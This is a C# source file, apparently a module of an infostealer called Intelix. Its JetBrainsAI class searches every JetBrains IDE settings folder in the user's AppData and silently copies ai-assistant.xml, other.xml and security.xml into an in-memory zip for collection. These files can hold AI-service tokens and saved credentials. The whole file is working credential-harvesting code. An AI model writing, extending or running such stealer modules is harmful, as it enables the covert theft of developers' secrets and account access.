using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.AI_Agent
{
    public class JetBrainsAI : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var entry = new Counter.CounterApplications { Name = "JetBrains AI" };
            string jetbrainsRoot = Path.Combine(appdata, "JetBrains");
            if (Directory.Exists(jetbrainsRoot))
            {
                foreach (string ideDir in Directory.GetDirectories(jetbrainsRoot))
                {
                    string optionsDir = Path.Combine(ideDir, "options");
                    if (!Directory.Exists(optionsDir)) continue;
                    string[] targetFiles = {
                        Path.Combine(optionsDir, "ai-assistant.xml"),
                        Path.Combine(optionsDir, "other.xml"),
                        Path.Combine(optionsDir, "security.xml")
                    };
                    foreach (string file in targetFiles)
                    {
                        if (!File.Exists(file)) continue;
                        try
                        {
                            string ideName = Path.GetFileName(ideDir);
                            string rel = "AI-Agent\\JetBrainsAI\\" + ideName + "\\" + Path.GetFileName(file);
                            zip.AddFile(rel, File.ReadAllBytes(file));
                            entry.Files.Add(file + " => " + rel);
                        }
                        catch { }
                    }
                }
            }
            if (entry.Files.Count > 0) counter.AI.Add(entry);
        }
    }
}
